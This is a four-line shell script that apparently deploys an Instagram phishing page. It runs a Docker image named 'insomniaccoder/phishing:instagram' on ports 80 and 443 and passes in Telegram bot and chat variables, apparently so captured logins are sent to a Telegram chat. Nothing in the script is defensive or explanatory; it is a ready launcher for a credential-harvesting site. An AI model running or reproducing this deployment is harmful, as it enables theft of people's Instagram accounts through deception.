docker stop phishing-tg 
docker rm phishing-tg 
docker run -e TGCHAT=$tgchat -e TGBOT=$tgbot --name phishing-tg -d -p 80:80 -p 443:443 -v $PWD/src:/var/www/html/ insomniaccoder/phishing:instagram
echo "Hello World !!"